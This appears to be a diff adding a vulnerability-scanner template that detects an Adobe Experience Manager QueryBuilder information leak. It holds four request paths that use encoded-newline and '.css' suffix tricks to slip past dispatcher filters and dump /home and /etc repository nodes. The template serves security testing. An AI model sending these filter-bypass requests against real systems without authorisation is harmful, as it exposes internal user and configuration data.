@@ -1,0 +1,24 @@
+id: aem-querybuilder-internal-path-read
+info:
+  author: DhiyaneshDk
+  name: AEM QueryBuilder Internal Path Read
+  reference: https://speakerdeck.com/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs?slide=91
+  severity: medium
+  tags: aem
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    type: word
+    words:
+    - jcr:path
+    - success
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1'
+  - '{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1'
+  - '{{BaseURL}}/bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1'
+  - '{{BaseURL}}/bin/querybuilder.json.css?path=/etc&p.hits=full&p.limit=-1'
